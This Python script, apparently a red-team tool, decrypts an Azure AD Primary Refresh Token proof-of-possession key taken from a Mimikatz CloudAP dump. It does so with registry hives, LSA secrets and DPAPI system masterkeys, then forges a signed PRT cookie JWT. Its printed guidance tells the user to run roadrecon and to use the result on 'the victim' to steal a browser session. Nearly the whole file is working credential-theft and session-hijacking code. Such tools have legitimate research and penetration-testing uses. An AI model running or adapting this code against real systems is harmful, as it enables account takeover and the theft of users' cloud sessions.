#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Copyright 2021, Tijl "Photubias" Deneut <tijl.deneut@howest.be>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""" Cloud AP PRT ProofOfPossesionKey KeyValue decryptor."""

import optparse, os, sys, base64, jwt

try:
    from dpapick3 import blob, masterkey, registry
except ImportError:
    raise ImportError('Missing dpapick3, please install via pip install dpapick3.')

def reverseByte(bByteInput):
    sReversed = ''
    sHexInput = bByteInput.hex()
    for x in range(-1, -len(str(sHexInput)), -2): sReversed += sHexInput[x-1] + sHexInput[x]
    return bytes.fromhex(sReversed)

def check_parameters(options, args):
    """Simple checks on the parameters set by the user."""
    if not args or not len(args) == 1:
        sys.exit('[-] You must provide an argument.')
    if options.mkhex: return
    if not options.security or not options.system:
        print('[-] To decrypt: You must provide SYSTEM and SECURITY hives (or decrypted HEX key).')
    if not options.masterkeydir:
        print('[-] To decrypt: You must provide the system DPAPI folder (or decrypted HEX key).')

if __name__ == '__main__':
    """Utility core."""
    usage = (
        'usage: %prog [options] POP_KeyValue\n\n'
        'It decrypts CloudAP ProofOfPossesionKeyValue\n'
        'as shown by a Mimikatz cloudap dump. It generally starts with\n'
        'AQAAAAEAA ...\n'
        'You must provide this key, SYSTEM and SECURITY hives and, finally,\n'
        'the system DPAPI MasterKeys, stored in '
        '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User.'
        )

    parser = optparse.OptionParser(usage=usage)
    parser.add_option('--masterkey', metavar='DIRECTORY', dest='masterkeydir', help='Folder to get Masterkey(s) from')
    parser.add_option('--system', metavar='HIVE', dest='system', help='SYSTEM hive')
    parser.add_option('--security', metavar='HIVE', dest='security', help='SECURITY hive')
    parser.add_option('--mkhex', metavar='HEX', dest='mkhex', help='Single 128 HEX masterkey')
    parser.add_option('--prt', metavar='STRING', dest='prt', help='PRT key to use to generate EY token')

    (options, args) = parser.parse_args()

    check_parameters(options, args)

    bKey = bDerivedKey = bContext = b''
    oFileData = base64.urlsafe_b64decode(args[0])
    iVersion = int(reverseByte(oFileData[:4]).hex(), 16)
    if not iVersion == 1: sys.exit('[-] Error: Key is encrypted using TPM. For now, please run mimikatz on the victim.')
    print('[+] Key in software, good to go')
    oBlob = blob.DPAPIBlob(oFileData[8:])
    print('[+] MK required: {}'.format(oBlob.mkguid))
    if not options.mkhex and not (options.system or options.security or options.masterkeydir):
        exit('[-] Please provide decryption details.')

    if not options.mkhex:
        reg = registry.Regedit()
        secrets = reg.get_lsa_secrets(options.security, options.system)
        dpapi_system = secrets.get('DPAPI_SYSTEM')['CurrVal']
        oMKP = masterkey.MasterKeyPool()
        oMKP.loadDirectory(options.masterkeydir)
        oMKP.addSystemCredential(dpapi_system)
        oMKP.try_credential_hash(None, None)
        oMKS = oMKP.getMasterKeys(oBlob.mkguid.encode())
        for oMK in oMKS:
            if oMK.decrypted:
                oBlob.decrypt(oMK.get_key())                
    else: 
        oBlob.decrypt(bytes.fromhex(options.mkhex))

    if oBlob.decrypted: bKey = oBlob.cleartext
    
    if bKey: 
        print('[+] Decryption succes!')
        print('    Clear Key:   {}'.format(bKey.hex()))
    else:
        print('[-] No key found')
        exit(0)

    if not sys.platform == 'win32':
        print('[-] Not running on Windows, please run AzureAD_Generate_Context.exe {} manually.'.format(bKey.hex()))
    elif not os.path.isfile('AzureAD_Generate_Context.exe'):
        print('[-] File AzureAD_Generate_Context.exe not found in current folder \n    Please run manually to get DerivedKey')
    else:
        print('[!] Found and running "AzureAD_Generate_Context.exe" now\n')
        sResult = os.popen('AzureAD_Generate_Context.exe {}'.format(bKey.hex())).read().rstrip('\n')
        for sLine in sResult.split('\n'): 
            print('[+] ' + sLine)
            if 'Context' in sLine: bContext = bytes.fromhex(sLine.split(':')[1].strip())
            elif 'Derived' in sLine: bDerivedKey = bytes.fromhex(sLine.split(':')[1].strip())

    if bContext and bDerivedKey: 
        print('[+] Run\n    roadrecon auth --prt <PRT> --prt-context <Context> --derived-key <DerivedKey>\n    for CLI AzureAD access.')

    if options.prt and bContext and bDerivedKey:
        bPRT = base64.urlsafe_b64decode(options.prt + '==')
        bJWT = jwt.encode({'refresh_token':bPRT.decode(), 'is_primary':'true', 'iat':'-32'}, bDerivedKey, algorithm='HS256', headers={'ctx':base64.b64encode(bContext).decode()})
        print('\n[+] Signature:   {}'.format(bJWT.decode()))
        print('[!] Run\n    roadrecon auth --prt-cookie <Signature>\n    to get a nonce and use that in PowerShell on the victim to steal a browser session (x-ms-RefreshTokenCredential)')
        
## TODO: automatically address roadrecon for .roadtools_auth?